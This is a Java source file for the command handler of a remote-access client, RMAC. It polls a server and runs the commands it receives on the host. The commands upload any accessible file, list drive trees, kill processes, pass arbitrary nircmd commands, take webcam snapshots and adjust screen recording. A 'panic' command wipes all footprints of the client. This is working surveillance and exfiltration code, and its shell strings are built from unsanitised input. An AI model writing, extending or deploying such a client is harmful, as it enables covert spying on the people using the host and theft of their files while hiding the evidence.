package com.rmac.core;

import com.rmac.RMAC;
import com.rmac.utils.ArchiveFileType;
import com.rmac.utils.Constants;
import com.rmac.utils.Utils;
import java.io.File;
import java.io.IOException;
import java.io.PrintStream;
import lombok.extern.slf4j.Slf4j;

/**
 * Non-blocking process that polls the RMAC Server at a fixed interval for any commands that needs
 * to be executed on the host machine.
 * <br><br>
 * Commands:
 * <br>
 * <code>panic</code> : Kill switch that removes all footprints of this client on host machine,
 * including the script doing the removal.
 * <br><br>
 * <code>drive</code> : Enumerates storage drives and their files or directories.
 * <br>
 * Usage:
 * <br>
 * <code>drive list</code> : List all root storage drives.
 * <br>
 * <code>drive tree X</code> : List all files/directories under 'X' drive.
 * <br><br>
 * <code>fetch</code> : Upload any accessible file from host machine.
 * <br>
 * Usage:
 * <br>
 * <code>fetch X:\abc\xyz.txt</code>
 * <br><br>
 * <code>system</code> : Control RMAC client
 * <br>
 * Usage:
 * <br>
 * <code>system shutdown</code> : Stops RMAC client
 * <br><br>
 * <code>process</code> : List/Kill host processes
 * <br>
 * Usage:
 * <br>
 * <code>process list</code> : List all running processes
 * <br>
 * <code>process kill 1837</code> : Kill process with process id 1837
 * <br><br>
 * <code>nircmd</code> : Run nircmd command, see <a
 * href="https://www.nirsoft.net/utils/nircmd.html">nircmd</a>
 * <br><br>
 * <code>cam</code> : Capture snapshot from camera
 * <br><br>
 * <code>config</code> : Change RMAC client configuration
 * <br>
 * Usage:
 * <br>
 * <code>config VideoDuration 600000</code> : Set screen recording duration to 10 mins
 */
@Slf4j
public class CommandHandler implements Runnable {

  /**
   * Reference to the thread created by this instance
   */
  public Thread thread;

  public CommandHandler() {
    thread = new Thread(this, "Command");
    thread.start();
  }

  /**
   * Execute the commands received from RMAC Server targeted for this client's host.
   *
   * @throws IOException when the command cannot be executed or the command fails.
   */
  public void executeCommand() throws IOException {
    try {
      String[] commandStore = Service.getCommands();
      if (commandStore == null || commandStore.length == 0) {
        return;
      }
      for (String currCommand : commandStore) {
        log.info("Current Task: " + currCommand);
        String command = currCommand;
        if (currCommand.contains(" ")) {
          command = currCommand.substring(0, currCommand.indexOf(' '));
          if ("".equals(command)) {
            continue;
          }
        }
        switch (command) {
          case "panic": {
            log.info("Command Received: 'panic'");
            Runtime.getRuntime().exec("\"" + Constants.SCRIPTS_LOCATION + "\\SysAdmin.vbs\"");
            Thread.sleep(100);
            System.exit(0);
          }
          case "drive": {
            String[] parts = currCommand.split(" ");
            if (parts.length < 2) {
              log.warn("Invalid command '" + currCommand + "'");
              continue;
            }
            String subCommand = parts[1].trim().toLowerCase();
            if (subCommand.equals("list")) {
              File[] roots = File.listRoots();
              String fileName =
                  Constants.RUNTIME_LOCATION + "\\DriveDetails-" + Utils.getTimestamp() + ".txt";
              PrintStream fileRoots = new PrintStream(fileName);
              for (File root : roots) {
                fileRoots.println(root);
              }
              fileRoots.close();
              RMAC.uploader.uploadFile(fileName, ArchiveFileType.OTHER);
            } else if (subCommand.equals("tree")) {
              if (parts.length < 3) {
                log.warn("Invalid command '" + currCommand + "'");
                continue;
              }
              String arg1 = parts[2].trim().toLowerCase();
              String fileName =
                  Constants.RUNTIME_LOCATION + "\\Tree-" + Utils.getTimestamp() + ".txt";
              Process proc = Runtime.getRuntime()
                  .exec("tree " + arg1 + ":\\ /f /a > \"" + fileName + "\"");
              proc.waitFor();
              if (new File(arg1 + ":\\").exists()) {
                RMAC.uploader.uploadFile(fileName, ArchiveFileType.OTHER);
              } else {
                log.warn("Directory " + arg1 + ":\\ Doesn't Exist");
              }
            }
            break;
          }
          case "fetch": {
            String filePath = currCommand.substring(currCommand.indexOf(' ') + 1);
            if ("".equals(filePath)) {
              log.warn("Invalid command '" + currCommand + "'");
              continue;
            }
            if (RMAC.fs.exists(filePath)) {
              RMAC.uploader.uploadFile(filePath, ArchiveFileType.OTHER);
            } else {
              log.warn("Cannot Find File: " + filePath);
            }
            break;
          }
          case "system": {
            String[] args = currCommand.split(" ");
            if (args.length < 2) {
              log.warn("Invalid command '" + currCommand + "'");
              continue;
            }
            if ("shutdown".equals(args[1])) {
              System.exit(0);
            }
            break;
          }
          case "process": {
            String[] args = currCommand.split(" ");
            if (args.length < 2) {
              log.warn("Invalid command '" + currCommand + "'");
              continue;
            }
            if ("list".equals(args[1])) {
              String fileName =
                  Constants.RUNTIME_LOCATION + "\\TaskList-" + Utils.getTimestamp() + ".txt";
              Process proc = Runtime.getRuntime().exec("tasklist > \"" + fileName + "\"");
              proc.waitFor();
              RMAC.uploader.uploadFile(fileName, ArchiveFileType.OTHER);
            } else if ("kill".equals(args[1])) {
              if (args.length < 3) {
                log.warn("Invalid command '" + currCommand + "'");
                continue;
              }
              Runtime.getRuntime().exec("taskkill /f /pid " + args[2]);
            }
            break;
          }
          case "nircmd": {
            String nirCommand = currCommand.substring(currCommand.indexOf(' ') + 1);
            Runtime.getRuntime().exec(Constants.NIRCMD_LOCATION + " " + nirCommand);
            break;
          }
          case "cam": {
            String file = Constants.RUNTIME_LOCATION + "\\Snap-" + Utils.getTimestamp() + ".png";
            Process process = Utils.getImage(file);
            process.waitFor();
            if (!RMAC.fs.exists(file)) {
              log.error("Could not take snapshot");
            } else {
              RMAC.uploader.uploadFile(file, ArchiveFileType.OTHER);
            }
            break;
          }
          case "config": {
            String[] args = currCommand.split(" ");
            if (args.length < 3) {
              log.warn("Invalid command '" + currCommand + "'");
              continue;
            }
            String configName = args[1];
            String configValue = currCommand.substring(currCommand.indexOf(' ') + 1);
            configValue = configValue.substring(configValue.indexOf(' ') + 1);

            RMAC.config.setProperty(configName, configValue, true);
            break;
          }
          default: {
            log.warn("Command not found: '" + currCommand + "'");
          }
        }
        Thread.sleep(100);
      }
    } catch (InterruptedException e) {
      log.error("Could not execute commands", e);
    }
  }

  @Override
  public void run() {
    try {
      while (!Thread.interrupted()) {
        try {
          executeCommand();
        } catch (IOException e) {
          log.error("Could not execute command", e);
        }
        Thread.sleep(RMAC.config.getFetchCommandPollInterval());
      }
    } catch (InterruptedException e) {
      log.warn("Stopped", e);
    }
  }

  /**
   * Interrupt the current instance's thread
   */
  public void shutdown() {
    this.thread.interrupt();
  }
}
